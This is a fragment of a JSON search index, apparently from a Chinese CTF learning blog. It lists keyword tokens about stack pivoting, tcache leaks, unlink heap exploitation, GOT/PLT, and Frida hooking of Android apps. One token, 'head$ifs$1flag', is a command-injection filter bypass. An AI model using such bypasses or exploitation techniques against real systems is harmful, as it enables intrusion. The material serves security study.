:1}}],[\"获取某个重载函数的全部数量\",{\"1\":{\"33\":1}}],[\"获取java类\",{\"1\":{\"31\":1,\"33\":2,\"34\":1,\"35\":1}}],[\"获取指定的java类\",{\"0\":{\"31\":1}}],[\"获取fd与bk\",{\"1\":{\"15\":1}}],[\"以便于交互\",{\"1\":{\"30\":1}}],[\"以及最容易理解错的是\",{\"1\":{\"4\":1}}],[\"使用此选项后\",{\"1\":{\"45\":1}}],[\"使用java平台\",{\"1\":{\"30\":1,\"31\":1}}],[\"使用java的平台\",{\"0\":{\"30\":1}}],[\"使用解析后的地址跳转执行目标函数\",{\"1\":{\"20\":1}}],[\"去找到androidmainfest\",{\"1\":{\"40\":1}}],[\"去hook脚本\",{\"1\":{\"28\":1}}],[\"去完成绑定\",{\"1\":{\"20\":1}}],[\"启动并且附带脚本\",{\"1\":{\"28\":1}}],[\"附着脚本\",{\"0\":{\"28\":1}}],[\"映射端口\",{\"0\":{\"24\":1}}],[\"|\",{\"1\":{\"23\":1,\"41\":7}}],[\"||\",{\"1\":{\"15\":1}}],[\"无名图书\",{\"1\":{\"23\":1}}],[\"方便我们取出名字\",{\"1\":{\"22\":1}}],[\"方便我们了解\",{\"1\":{\"20\":1}}],[\"相当于遍历\",{\"1\":{\"35\":1}}],[\"相当于向java层提供了一个callback函数\",{\"1\":{\"30\":1}}],[\"相当于\",{\"1\":{\"22\":1}}],[\"相当于是告诉我们plt\",{\"1\":{\"22\":1}}],[\"可以用于查看和编辑文件内容\",{\"1\":{\"45\":1}}],[\"可以向上翻页\",{\"1\":{\"45\":1}}],[\"可以构造多个同名字的函数\",{\"1\":{\"33\":1}}],[\"可以粗俗得当作一个属于\",{\"1\":{\"22\":1}}],[\"可以通过use\",{\"1\":{\"6\":1}}],[\"省略点将\",{\"1\":{\"22\":1}}],[\"博客园\",{\"1\":{\"21\":1}}],[\"深入理解\",{\"1\":{\"21\":1}}],[\"深入窥探动态链接\",{\"1\":{\"20\":1}}],[\"参考文章android之frida框架完全使用指南\",{\"1\":{\"23\":1}}],[\"参考文章\",{\"1\":{\"21\":1}}],[\"需要实际实现\",{\"1\":{\"20\":1}}],[\"需要了解的参考这个文章\",{\"1\":{\"20\":1}}],[\"放入\",{\"1\":{\"20\":1}}],[\"恢复原始的返回地址\",{\"1\":{\"20\":1}}],[\"恢复第一个参数\",{\"1\":{\"20\":1}}],[\"恢复第二个参数\",{\"1\":{\"20\":1}}],[\"恢复寄存器\",{\"1\":{\"20\":1}}],[\"返回解析后的函数地址在\",{\"1\":{\"20\":1}}],[\"返回地址\",{\"1\":{\"20\":2}}],[\"符号索引\",{\"1\":{\"20\":1}}],[\"来获取名字了\",{\"1\":{\"22\":1}}],[\"来解析符号地址\",{\"1\":{\"20\":1}}],[\"来到了\",{\"1\":{\"4\":1}}],[\"调用构造函数\",{\"1\":{\"34\":1}}],[\"调用原函数\",{\"1\":{\"34\":1}}],[\"调用原本的函数\",{\"0\":{\"32\":1}}],[\"调用原来的函数\",{\"1\":{\"31\":1,\"33\":1}}],[\"调用\",{\"1\":{\"20\":1}}],[\"调试技巧\",{\"0\":{\"16\":1}}],[\"现在在栈顶\",{\"1\":{\"20\":1}}],[\"第一次拿到这个附件\",{\"1\":{\"44\":1}}],[\"第一次我使用的教程上面说的\",{\"1\":{\"43\":1}}],[\"第一个参数\",{\"1\":{\"20\":1}}],[\"第二个参数\",{\"1\":{\"20\":1}}],[\"通常是符号索引\",{\"1\":{\"20\":1}}],[\"通过p的fd\",{\"1\":{\"15\":1}}],[\"通过将ebp覆盖成构造的fake\",{\"1\":{\"3\":1}}],[\"传递\",{\"1\":{\"20\":1}}],[\"实验float的存储数据\",{\"0\":{\"51\":1}}],[\"实战\",{\"0\":{\"39\":1}}],[\"实现会在这里\",{\"1\":{\"20\":1}}],[\"实现函数调用\",{\"1\":{\"20\":1}}],[\"实际的\",{\"1\":{\"20\":1}}],[\"实际实现会根据系统的动态链接器的具体需求和优化而有所不同\",{\"1\":{\"20\":1}}],[\"注意\",{\"1\":{\"20\":1}}],[\"汇编\",{\"1\":{\"20\":1}}],[\"示例\",{\"1\":{\"20\":1}}],[\"jrs\",{\"1\":{\"44\":1}}],[\"jailed\",{\"1\":{\"41\":1,\"43\":1}}],[\"java会自动给你补上\",{\"1\":{\"34\":1}}],[\"java\",{\"1\":{\"31\":2,\"35\":2,\"36\":1,\"41\":3}}],[\"js代码\",{\"1\":{\"33\":1}}],[\"js代码的书写\",{\"0\":{\"29\":1}}],[\"js\",{\"1\":{\"28\":2,\"41\":2}}],[\"js脚本\",{\"0\":{\"27\":1}}],[\"jmp\",{\"1\":{\"20\":4}}],[\"just\",{\"1\":{\"8\":1}}],[\"与less类似\",{\"1\":{\"45\":1}}],[\"与got\",{\"1\":{\"20\":1}}],[\"与bk\",{\"1\":{\"15\":1}}],[\"并且\",{\"1\":{\"20\":1}}],[\"并且被清空\",{\"1\":{\"12\":1}}],[\"中出现了调用原本的函数\",{\"1\":{\"32\":1}}],[\"中的这个n\",{\"1\":{\"22\":1}}],[\"中的空闲\",{\"1\":{\"6\":1}}],[\"中\",{\"1\":{\"20\":3}}],[\"中被使用\",{\"1\":{\"20\":1}}],[\"中push\",{\"1\":{\"20\":1}}],[\"34\",{\"1\":{\"51\":1}}],[\"30h\",{\"1\":{\"50\":1}}],[\"3\",{\"1\":{\"20\":2,\"45\":1}}],[\"36\",{\"1\":{\"11\":1}}],[\"运行plt\",{\"1\":{\"20\":2}}],[\"知乎\",{\"1\":{\"20\":1}}],[\"部分前置知识讲解\",{\"0\":{\"19\":1}}],[\"学习经验\",{\"1\":{\"38\":1}}],[\"学习路线\",{\"0\":{\"17\":1},\"1\":{\"17\":1}}],[\"学习文章\",{\"1\":{\"7\":1,\"14\":1}}],[\"把中间的chunk忽略掉\",{\"1\":{\"15\":1}}],[\"把fake\",{\"1\":{\"4\":1}}],[\"等效为\",{\"1\":{\"15\":1}}],[\"ⅱ\",{\"1\":{\"15\":1}}],[\"ⅰ\",{\"1\":{\"15\":1}}],[\"脱链\",{\"1\":{\"15\":1}}],[\"将返回地址移动到\",{\"1\":{\"20\":1}}],[\"将p\",{\"1\":{\"15\":2}}],[\"将reloc\",{\"1\":{\"20\":1}}],[\"将rip寄存器改值\",{\"1\":{\"4\":1}}],[\"将rbp寄存器改值\",{\"1\":{\"4\":1}}],[\"检查\",{\"1\":{\"15\":1}}],[\"检查下一个chunk的prev\",{\"1\":{\"15\":1}}],[\"v4\",{\"1\":{\"51\":4}}],[\"v2\",{\"1\":{\"50\":3}}],[\"v1\",{\"1\":{\"50\":2}}],[\"vim命令\",{\"1\":{\"45\":1}}],[\"vi\",{\"1\":{\"45\":1}}],[\"verbose\",{\"1\":{\"45\":1}}],[\"v\",{\"1\":{\"45\":1}}],[\"value\",{\"1\":{\"35\":2,\"50\":1,\"51\":3}}],[\"value=999\",{\"1\":{\"35\":2}}],[\"value=\",{\"1\":{\"35\":1}}],[\"vararg\",{\"1\":{\"51\":1}}],[\"var\",{\"1\":{\"31\":2,\"33\":5,\"34\":1,\"35\":1,\"36\":5,\"37\":5,\"41\":3}}],[\"void\",{\"1\":{\"34\":1,\"35\":2}}],[\"vs\",{\"1\":{\"15\":1}}],[\"vmmap得到的\",{\"1\":{\"9\":1}}],[\"流程\",{\"0\":{\"15\":1}}],[\"前一个chunk的指针\",{\"1\":{\"14\":1}}],[\"待脱链的空闲chunk的指针\",{\"1\":{\"14\":1}}],[\"宏定义\",{\"1\":{\"14\":1}}],[\"明确一下对象双向链表\",{\"1\":{\"14\":1}}],[\"腾讯云\",{\"1\":{\"14\":1}}],[\"腾讯云开发者社区\",{\"1\":{\"14\":1}}],[\"先学习unlink漏洞\",{\"0\":{\"14\":1}}],[\"构造heap\",{\"1\":{\"13\":1}}],[\"漏洞学习\",{\"0\":{\"13\":1}}],[\"直接向emo\",{\"1\":{\"12\":1}}],[\"在处理文本时会将这些字符视为字段之间的分隔符\",{\"1\":{\"47\":1}}],[\"在处理多个文件时不打印每个文件的名称作为头部\",{\"1\":{\"45\":1}}],[\"在退出\",{\"1\":{\"45\":1}}],[\"在到达文件末尾时自动退出\",{\"1\":{\"45\":1}}],[\"在搜索时忽略大小写\",{\"1\":{\"45\":1}}],[\"在hook函数之后执行\",{\"1\":{\"37\":1}}],[\"在hook函数之前执行\",{\"1\":{\"37\":1}}],[\"在整个搜索流程完成的时候会调用\",{\"1\":{\"35\":1}}],[\"在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了\",{\"1\":{\"33\":1}}],[\"在\",{\"1\":{\"20\":1}}],[\"在delemo的时候是根据emo\",{\"1\":{\"12\":1}}],[\"在addemo的时候name\",{\"1\":{\"12\":1}}],[\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",{\"1\":{\"51\":1}}],[\"但是好像可以用命令行来解决这个问题比如我们这里用指令\",{\"1\":{\"3\":1}}],[\"但是功能较少\",{\"1\":{\"45\":1}}],[\"但是其实这里r\",{\"1\":{\"22\":1}}],[\"但是没有清空\",{\"1\":{\"12\":1}}],[\"马上free了\",{\"1\":{\"12\":1}}],[\"11\",{\"1\":{\"50\":2,\"51\":2}}],[\"11451\",{\"1\":{\"41\":4,\"43\":1}}],[\"1存的就是link\",{\"1\":{\"20\":1}}],[\"1\",{\"1\":{\"20\":4,\"36\":2,\"41\":6,\"45\":1}}],[\"16\",{\"1\":{\"11\":3,\"37\":1,\"41\":1}}],[\"127\",{\"1\":{\"41\":4}}],[\"12\",{\"1\":{\"11\":2}}],[\"100\",{\"1\":{\"45\":2}}],[\"10\",{\"1\":{\"11\":2}}],[\"80\",{\"1\":{\"51\":1}}],[\"888\",{\"1\":{\"34\":1,\"35\":1}}],[\"8\",{\"1\":{\"11\":2,\"41\":1}}],[\"8byte\",{\"0\":{\"1\":1}}],[\"00\",{\"1\":{\"51\":1}}],[\"00000000004007f4\",{\"1\":{\"51\":1}}],[\"0\",{\"1\":{\"11\":1,\"15\":2,\"20\":3,\"41\":9,\"44\":1,\"50\":2,\"51\":1}}],[\"0x41348000\",{\"1\":{\"52\":1}}],[\"0x400000\",{\"1\":{\"50\":1}}],[\"0x30\",{\"1\":{\"52\":1}}],[\"0x61fe1c\",{\"1\":{\"51\":1}}],[\"0xc7df9b0041348000\",{\"1\":{\"51\":1}}],[\"0x7fffffffdee4\",{\"1\":{\"51\":1}}],[\"0x7f566befac78\",{\"1\":{\"9\":1}}],[\"0x7620656854006625\",{\"1\":{\"51\":1}}],[\"0x555555556004\",{\"1\":{\"51\":1}}],[\"0x5555555551c7\",{\"1\":{\"51\":1}}],[\"0x55e22cd98000+0x10\",{\"1\":{\"9\":1}}],[\"0x18\",{\"1\":{\"15\":3}}],[\"0x10\",{\"1\":{\"9\":1,\"12\":1,\"15\":3}}],[\"0x000055e22cd98a10+0x30+0x110\",{\"1\":{\"9\":1}}],[\"指向的是否是p\",{\"1\":{\"15\":1}}],[\"指针为char类型\",{\"1\":{\"11\":1}}],[\"指令的地址\",{\"1\":{\"20\":1}}],[\"指令来查看对应地址\",{\"1\":{\"9\":1}}],[\"指令\",{\"1\":{\"4\":1}}],[\"存储\",{\"1\":{\"22\":1}}],[\"存一个int\",{\"1\":{\"11\":1}}],[\"存一个结构体指针\",{\"1\":{\"11\":1}}],[\"存name\",{\"1\":{\"11\":1}}],[\"存content\",{\"1\":{\"11\":1}}],[\"存\",{\"1\":{\"11\":1}}],[\"存size\",{\"1\":{\"11\":1}}],[\"存使用情况\",{\"1\":{\"11\":2}}],[\"存入fake\",{\"1\":{\"4\":1}}],[\"28355\",{\"1\":{\"52\":1}}],[\"28125\",{\"1\":{\"50\":3,\"51\":2}}],[\"2存的是\",{\"1\":{\"20\":1}}],[\"2\",{\"1\":{\"20\":1,\"45\":1}}],[\"2+n\",{\"1\":{\"20\":1}}],[\"20\",{\"1\":{\"11\":2}}],[\"20是存name的\",{\"1\":{\"11\":1}}],[\"26gx\",{\"1\":{\"9\":3}}],[\"5\",{\"1\":{\"11\":1,\"45\":3}}],[\"+p32\",{\"1\":{\"52\":1}}],[\"+fun\",{\"1\":{\"37\":1}}],[\"+this\",{\"1\":{\"35\":2}}],[\"+num\",{\"1\":{\"33\":1}}],[\"+8\",{\"1\":{\"11\":1}}],[\"+40\",{\"1\":{\"11\":1}}],[\"+20\",{\"1\":{\"11\":1}}],[\"+12\",{\"1\":{\"11\":1}}],[\"+\",{\"1\":{\"11\":8,\"15\":4,\"37\":1}}],[\"查找关键结构体\",{\"1\":{\"11\":1}}],[\"进入\",{\"1\":{\"11\":1}}],[\"进行内存释放时\",{\"1\":{\"6\":1}}],[\"分析一下题\",{\"0\":{\"11\":1}}],[\"计算\",{\"1\":{\"9\":1}}],[\"再去查找libc的基地址\",{\"1\":{\"9\":1}}],[\"再利用leave\",{\"1\":{\"3\":1}}],[\"另一个为0x110\",{\"1\":{\"9\":1}}],[\"大概就是调用\",{\"1\":{\"20\":1}}],[\"大小检查\",{\"1\":{\"15\":1}}],[\"大小为0x30\",{\"1\":{\"9\":1}}],[\"大于max\",{\"1\":{\"6\":1}}],[\"一筹莫展\",{\"1\":{\"44\":1}}],[\"一个测试脚本\",{\"0\":{\"41\":1}}],[\"一个好看的电子书网站\",{\"1\":{\"23\":1}}],[\"一个gundam包含两个chunk\",{\"1\":{\"9\":1}}],[\"一对应\",{\"1\":{\"20\":1}}],[\"一\",{\"1\":{\"20\":1}}],[\"一道题彻底理解\",{\"1\":{\"14\":1}}],[\"一共有64个bins\",{\"1\":{\"7\":1}}],[\"让第八个gundam出现在unsorted\",{\"1\":{\"9\":1}}],[\"也是用于分页查看文件内容\",{\"1\":{\"45\":1}}],[\"也没有看见什么东西\",{\"1\":{\"44\":1}}],[\"也可以不写\",{\"1\":{\"34\":1}}],[\"也就是找到所有类型为这个类的对象\",{\"1\":{\"35\":1}}],[\"也就是\",{\"1\":{\"22\":1}}],[\"也就是会自动跳转plt\",{\"1\":{\"20\":1}}],[\"也就是main\",{\"1\":{\"9\":1}}],[\"也就是最后一个加入tcache的chunk\",{\"1\":{\"9\":1}}],[\"也属于一个堆块\",{\"1\":{\"9\":1}}],[\"x19`\",{\"1\":{\"41\":1}}],[\"x19\",{\"1\":{\"40\":1,\"41\":4,\"43\":1}}],[\"xml文件\",{\"1\":{\"40\":1}}],[\"xxx\",{\"1\":{\"28\":1}}],[\"xxxxx\",{\"1\":{\"28\":1}}],[\"xxxxxx\",{\"1\":{\"28\":1}}],[\"xxxx\",{\"1\":{\"24\":2,\"28\":1}}],[\"x86\",{\"1\":{\"20\":1}}],[\"x\",{\"1\":{\"9\":2,\"45\":1}}],[\"堆结构\",{\"1\":{\"9\":1}}],[\"用于定义字段边界\",{\"1\":{\"47\":1}}],[\"用于在文件中加上行号\",{\"1\":{\"45\":1}}],[\"用于查看文件的后几行内容\",{\"1\":{\"45\":1}}],[\"用于查看文件的前几行内容\",{\"1\":{\"45\":1}}],[\"用于分页查看文件内容\",{\"1\":{\"45\":1}}],[\"用于将文件内容输出到终端上\",{\"1\":{\"45\":1}}],[\"用于说明目的\",{\"1\":{\"20\":1}}],[\"用提取数组的方式依次hook这些重载函数\",{\"1\":{\"33\":1}}],[\"用来表示\",{\"1\":{\"22\":1}}],[\"用x\",{\"1\":{\"9\":1}}],[\"用vmmap指令查找heap最开始的位置\",{\"1\":{\"9\":1}}],[\"利用tcache泄露地址\",{\"0\":{\"9\":1}}],[\"结果\",{\"1\":{\"34\":1}}],[\"结构图\",{\"1\":{\"8\":1}}],[\"结合偏移值从而得到libc的加载地址\",{\"1\":{\"6\":1}}],[\"work\",{\"1\":{\"50\":1}}],[\"world\",{\"1\":{\"35\":1,\"41\":1}}],[\"while\",{\"1\":{\"44\":1}}],[\"which\",{\"1\":{\"8\":1}}],[\"windows\",{\"1\":{\"41\":1}}],[\"wrapper类的method方法\",{\"1\":{\"31\":1}}],[\"we\",{\"1\":{\"8\":1}}],[\"nx\",{\"1\":{\"50\":2}}],[\"nssctf\",{\"0\":{\"55\":1},\"1\":{\"50\":1,\"52\":1}}],[\"nl命令\",{\"1\":{\"45\":1}}],[\"nc签到题\",{\"0\":{\"44\":1}}],[\"nativepointer\",{\"1\":{\"37\":1}}],[\"name=\",{\"1\":{\"37\":1}}],[\"name来调用原本的函数\",{\"1\":{\"32\":1}}],[\"name获取我们需要的函数名字在\",{\"1\":{\"22\":1}}],[\"name就是我们需要的函数名了\",{\"1\":{\"22\":1}}],[\"name\",{\"1\":{\"11\":1,\"22\":5,\"34\":1,\"35\":5,\"36\":4,\"37\":1,\"41\":6,\"45\":2}}],[\"nickname+\",{\"1\":{\"35\":1}}],[\"nickname\",{\"1\":{\"35\":4}}],[\"need\",{\"1\":{\"41\":1,\"43\":1}}],[\"netease\",{\"1\":{\"40\":1,\"41\":5,\"43\":1}}],[\"new\",{\"1\":{\"34\":2}}],[\"next8\",{\"1\":{\"11\":1}}],[\"next12\",{\"1\":{\"11\":1}}],[\"next\",{\"1\":{\"8\":1,\"15\":1}}],[\"numbers\",{\"1\":{\"45\":1}}],[\"number\",{\"1\":{\"35\":7,\"50\":1,\"52\":1}}],[\"num\",{\"1\":{\"33\":1}}],[\"null漏洞\",{\"1\":{\"13\":1}}],[\"null\",{\"1\":{\"8\":1}}],[\"node5\",{\"1\":{\"52\":1}}],[\"no\",{\"1\":{\"28\":3,\"41\":3,\"45\":1,\"50\":2}}],[\"note\",{\"1\":{\"8\":1}}],[\"n\",{\"1\":{\"20\":1,\"22\":2,\"45\":5,\"51\":2,\"52\":1}}],[\"os\",{\"1\":{\"44\":2}}],[\"options\",{\"1\":{\"41\":1,\"45\":4}}],[\"out\",{\"1\":{\"34\":1,\"35\":1}}],[\"objection\",{\"0\":{\"42\":1},\"1\":{\"43\":1}}],[\"object\",{\"1\":{\"41\":2}}],[\"obj\",{\"1\":{\"21\":1,\"35\":4}}],[\"overlength=student\",{\"1\":{\"33\":1}}],[\"overloads\",{\"1\":{\"33\":3}}],[\"overload\",{\"1\":{\"33\":1}}],[\"overlap\",{\"1\":{\"13\":1}}],[\"overall\",{\"1\":{\"8\":1}}],[\"off\",{\"1\":{\"37\":1}}],[\"off=0x7078\",{\"1\":{\"37\":1}}],[\"offset是一个绝对地址\",{\"1\":{\"22\":1}}],[\"offset\",{\"1\":{\"22\":2,\"37\":1}}],[\"of\",{\"1\":{\"8\":1,\"51\":2}}],[\"on\",{\"1\":{\"41\":1,\"43\":1}}],[\"onleave\",{\"1\":{\"37\":1}}],[\"only\",{\"1\":{\"3\":1}}],[\"oncomplete\",{\"1\":{\"35\":1,\"36\":1,\"41\":1}}],[\"oncompete\",{\"1\":{\"35\":1}}],[\"onmatch\",{\"1\":{\"35\":2,\"36\":1,\"41\":1}}],[\"onenter\",{\"1\":{\"37\":1}}],[\"one\",{\"1\":{\"8\":1,\"45\":1}}],[\"由于有个gets函数\",{\"1\":{\"50\":1}}],[\"由于这个是开发知识就不细讲了\",{\"1\":{\"34\":1}}],[\"由于我是是第一次的调用\",{\"1\":{\"20\":1}}],[\"由于是单链形式\",{\"1\":{\"8\":1}}],[\"由于linux中使用free\",{\"1\":{\"6\":1}}],[\"代码\",{\"1\":{\"8\":1}}],[\"机制\",{\"0\":{\"8\":1},\"1\":{\"8\":1}}],[\"当我们获取到java类之后\",{\"1\":{\"31\":1}}],[\"当我们执行read函数的时候\",{\"1\":{\"4\":1}}],[\"当对应的tcahe\",{\"1\":{\"7\":1}}],[\"该地址的相对偏移值存放在libc\",{\"1\":{\"6\":1}}],[\"usage\",{\"1\":{\"41\":1}}],[\"users\",{\"1\":{\"41\":1}}],[\"use\",{\"1\":{\"0\":1,\"31\":2,\"33\":2,\"34\":1,\"35\":1,\"36\":1,\"41\":1}}],[\"u\",{\"1\":{\"25\":1,\"28\":2,\"41\":1}}],[\"unable\",{\"1\":{\"43\":1}}],[\"unrecognized\",{\"1\":{\"41\":1}}],[\"unr4v31\",{\"1\":{\"21\":1}}],[\"unlink\",{\"1\":{\"14\":2}}],[\"unlink+offbynull\",{\"0\":{\"10\":1}}],[\"unsortedbin头结点\",{\"1\":{\"9\":1}}],[\"unsorted\",{\"1\":{\"7\":1,\"9\":1}}],[\"unsortbin的fd和bk指向自身main\",{\"1\":{\"6\":1}}],[\"首先\",{\"1\":{\"8\":1}}],[\"首先是tcahe是单链表结构\",{\"1\":{\"7\":1}}],[\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址\",{\"1\":{\"4\":1}}],[\"首先会被放到\",{\"1\":{\"6\":1}}],[\"被释放后\",{\"1\":{\"6\":1}}],[\"的值可以改变\",{\"1\":{\"47\":1}}],[\"的工作原理\",{\"0\":{\"47\":1}}],[\"的前\",{\"1\":{\"45\":2}}],[\"的搜索是区分大小写的\",{\"1\":{\"45\":1}}],[\"的时候相当于会自动去调用函数\",{\"1\":{\"34\":1}}],[\"的方式来hook\",{\"1\":{\"31\":1}}],[\"的参数给\",{\"1\":{\"20\":1}}],[\"的内容为\",{\"1\":{\"20\":1}}],[\"的地方\",{\"1\":{\"20\":1}}],[\"的\",{\"1\":{\"6\":1}}],[\"gdb\",{\"1\":{\"52\":1}}],[\"gdb调试一下\",{\"1\":{\"51\":1}}],[\"get\",{\"1\":{\"51\":1}}],[\"gets\",{\"1\":{\"50\":1}}],[\"getdeclaredmethods\",{\"1\":{\"36\":1,\"41\":1}}],[\"g\",{\"1\":{\"43\":2,\"45\":1}}],[\"gadget\",{\"1\":{\"41\":2,\"43\":1}}],[\"gadget链来实现\",{\"1\":{\"4\":1}}],[\"guess\",{\"1\":{\"50\":1,\"52\":1}}],[\"guishouflags\",{\"1\":{\"35\":1}}],[\"guishou\",{\"1\":{\"34\":1}}],[\"gundam\",{\"0\":{\"5\":1}}],[\"global\",{\"1\":{\"20\":1}}],[\"glibc\",{\"1\":{\"7\":1}}],[\"got\",{\"1\":{\"20\":3}}],[\"got表和plt表详细解说\",{\"0\":{\"20\":1}}],[\"h>\",{\"1\":{\"51\":1}}],[\"hilite\",{\"1\":{\"45\":1}}],[\"hitcon\",{\"0\":{\"5\":1}}],[\"https\",{\"1\":{\"41\":1}}],[\"h\",{\"1\":{\"41\":2}}],[\"handler\",{\"1\":{\"36\":1,\"41\":1}}],[\"have\",{\"1\":{\"8\":1}}],[\"hook无导出函数\",{\"1\":{\"37\":1}}],[\"hook构造函数\",{\"1\":{\"34\":1}}],[\"hook构造方法\",{\"0\":{\"34\":1}}],[\"hooktest9\",{\"1\":{\"37\":1}}],[\"hooktest6\",{\"1\":{\"36\":1}}],[\"hooktest4\",{\"1\":{\"35\":1}}],[\"hooktest3\",{\"1\":{\"34\":1}}],[\"hooktest2\",{\"1\":{\"33\":1}}],[\"hooktest1\",{\"1\":{\"33\":1}}],[\"hook所有重载函数\",{\"1\":{\"33\":1}}],[\"hook重载方法\",{\"1\":{\"33\":1}}],[\"hook重载函数\",{\"0\":{\"33\":1}}],[\"hookdemo01\",{\"1\":{\"31\":1,\"33\":2,\"34\":1,\"35\":2,\"36\":2}}],[\"hook\",{\"0\":{\"27\":1,\"37\":1,\"41\":1},\"1\":{\"31\":1,\"33\":1,\"37\":2,\"41\":2}}],[\"hook相关\",{\"0\":{\"26\":1}}],[\"homepage\",{\"1\":{\"0\":1}}],[\"home\",{\"0\":{\"0\":1},\"1\":{\"0\":2,\"41\":1,\"50\":1}}],[\"hex\",{\"1\":{\"51\":1}}],[\"head$ifs$1flag\",{\"1\":{\"49\":1}}],[\"head\",{\"1\":{\"45\":4}}],[\"head命令\",{\"1\":{\"45\":1}}],[\"heap可以查看当前的chunk\",{\"1\":{\"16\":1}}],[\"heap\",{\"1\":{\"9\":1,\"14\":1}}],[\"help\",{\"1\":{\"41\":2,\"45\":1}}],[\"hello\",{\"1\":{\"35\":1}}],[\"hence\",{\"1\":{\"8\":1}}],[\"cn\",{\"1\":{\"52\":1}}],[\"cnblogs\",{\"1\":{\"21\":1}}],[\"cp\",{\"1\":{\"50\":1}}],[\"ctf\",{\"1\":{\"50\":1}}],[\"cdecl\",{\"1\":{\"51\":1}}],[\"cd\",{\"1\":{\"44\":1}}],[\"c\",{\"1\":{\"41\":1,\"45\":2}}],[\"clz\",{\"1\":{\"41\":2}}],[\"clz=java\",{\"1\":{\"36\":1}}],[\"classes\",{\"1\":{\"36\":3}}],[\"classes=java\",{\"1\":{\"36\":1}}],[\"class\",{\"1\":{\"33\":1,\"34\":2,\"35\":1,\"36\":1,\"41\":2}}],[\"classname\",{\"1\":{\"31\":1}}],[\"canary\",{\"1\":{\"50\":1}}],[\"case\",{\"1\":{\"45\":1}}],[\"cat命令\",{\"1\":{\"45\":1}}],[\"cat\",{\"1\":{\"44\":1,\"50\":1}}],[\"call\",{\"1\":{\"20\":1,\"51\":1}}],[\"cache\",{\"1\":{\"8\":1}}],[\"cherry\",{\"1\":{\"48\":2}}],[\"chop\",{\"1\":{\"45\":1}}],[\"choose\",{\"1\":{\"35\":1}}],[\"choose函数\",{\"1\":{\"35\":1}}],[\"chars\",{\"1\":{\"45\":1}}],[\"char\",{\"1\":{\"8\":1,\"11\":1,\"50\":1,\"51\":2}}],[\"chunksize\",{\"1\":{\"15\":1}}],[\"chunk分析\",{\"0\":{\"12\":1}}],[\"chunk的chunk\",{\"1\":{\"7\":1}}],[\"chunk\",{\"1\":{\"6\":2,\"15\":2}}],[\"corrupted\",{\"1\":{\"15\":2}}],[\"command\",{\"1\":{\"44\":3}}],[\"commands\",{\"1\":{\"41\":1}}],[\"com\",{\"1\":{\"14\":1,\"20\":1,\"21\":1,\"31\":1,\"33\":2,\"34\":1,\"35\":2,\"36\":2,\"40\":1,\"41\":4,\"43\":1}}],[\"counted\",{\"1\":{\"8\":1}}],[\"counts\",{\"1\":{\"8\":2}}],[\"counts代表着每个bin当前所有的chunk数量\",{\"1\":{\"8\":1}}],[\"could\",{\"1\":{\"8\":1}}],[\"const\",{\"1\":{\"51\":2}}],[\"console\",{\"1\":{\"31\":1,\"33\":2,\"35\":2,\"36\":3,\"37\":2,\"41\":3}}],[\"connect\",{\"1\":{\"43\":1}}],[\"connected\",{\"1\":{\"41\":1}}],[\"control\",{\"1\":{\"45\":1}}],[\"content是否为空去判断的\",{\"1\":{\"12\":1}}],[\"content是否为空去编辑的\",{\"1\":{\"12\":1}}],[\"content中写入内容\",{\"1\":{\"12\":1}}],[\"content被清空\",{\"1\":{\"12\":1}}],[\"content的时候malloc\",{\"1\":{\"12\":1}}],[\"content的内容\",{\"1\":{\"11\":1}}],[\"content\",{\"1\":{\"11\":1}}],[\"contains\",{\"1\":{\"8\":1}}],[\"configuration\",{\"1\":{\"0\":1}}],[\"csdn博客推荐下载书的网站\",{\"1\":{\"23\":1}}],[\"csdn博客\",{\"1\":{\"7\":1}}],[\"c2018\",{\"0\":{\"5\":1}}],[\"=function\",{\"1\":{\"31\":1,\"32\":1}}],[\"==\",{\"1\":{\"15\":4,\"50\":1}}],[\"=\",{\"1\":{\"4\":1,\"8\":1,\"15\":13,\"22\":6,\"31\":1,\"33\":1,\"34\":2,\"35\":4,\"36\":2,\"41\":4,\"44\":4,\"50\":1,\"51\":2,\"52\":3}}],[\"此时我们rsp\",{\"1\":{\"4\":1}}],[\"还任然留在了原地\",{\"1\":{\"4\":1}}],[\"栈的指针寄存器\",{\"1\":{\"4\":1}}],[\"栈迁移+float数据格式\",{\"0\":{\"50\":1}}],[\"栈迁移核心\",{\"0\":{\"4\":1}}],[\"栈迁移的大致操作\",{\"0\":{\"3\":1}}],[\"栈迁移\",{\"0\":{\"2\":1}}],[\"换句话说\",{\"1\":{\"4\":1}}],[\"到现在我们就可以理清楚了核心需要实现的部分\",{\"1\":{\"4\":1}}],[\"所以才改后缀为py\",{\"1\":{\"44\":1}}],[\"所以我有点想直接覆盖数据为11\",{\"1\":{\"50\":1}}],[\"所以我带上参数\",{\"1\":{\"41\":1}}],[\"所以我们尝试objection\",{\"1\":{\"43\":1}}],[\"所以我们就不带这个了\",{\"1\":{\"41\":1}}],[\"所以我们需要overload标明参数\",{\"1\":{\"33\":1}}],[\"所以我们其实可以在callback函数里面用this\",{\"1\":{\"32\":1}}],[\"所以我们只需要把寄存器的值改变就实现了栈迁移\",{\"1\":{\"4\":1}}],[\"所以在callback函数中我们的操作对象是每一个对象\",{\"1\":{\"35\":1}}],[\"所以总结一下\",{\"1\":{\"22\":1}}],[\"所以got\",{\"1\":{\"20\":1}}],[\"所以每个元素\",{\"1\":{\"11\":1}}],[\"所以结构体属性就是下一个chunk的指针\",{\"1\":{\"8\":1}}],[\"所以这里我们是需要构造第二个fake\",{\"1\":{\"4\":1}}],[\"所以当执行完ret后整个程序流程就跑到了read\",{\"1\":{\"4\":1}}],[\">java\",{\"1\":{\"30\":1}}],[\">fd置为\",{\"1\":{\"15\":1}}],[\">fd\",{\"1\":{\"15\":14}}],[\">bk与\",{\"1\":{\"15\":1}}],[\">bk设置为\",{\"1\":{\"15\":1}}],[\">bk\",{\"1\":{\"15\":13}}],[\">劫持程序流程\",{\"1\":{\"4\":1}}],[\">栈迁移\",{\"1\":{\"4\":1}}],[\">\",{\"1\":{\"4\":1,\"41\":5}}],[\"然后在scanf里面下idapython脚本\",{\"1\":{\"51\":1}}],[\"然后我们得到了一堆数据\",{\"1\":{\"41\":1}}],[\"然后我们就可以通过\",{\"1\":{\"22\":1}}],[\"然后我们就得到了main\",{\"1\":{\"9\":1}}],[\"然后我们就成功完成了一次栈迁移\",{\"1\":{\"4\":1}}],[\"然后搜索发现是我修改了默认的端口号为11451\",{\"1\":{\"41\":1}}],[\"然后搜索package=xxxx这个xxxx就是包的名字\",{\"1\":{\"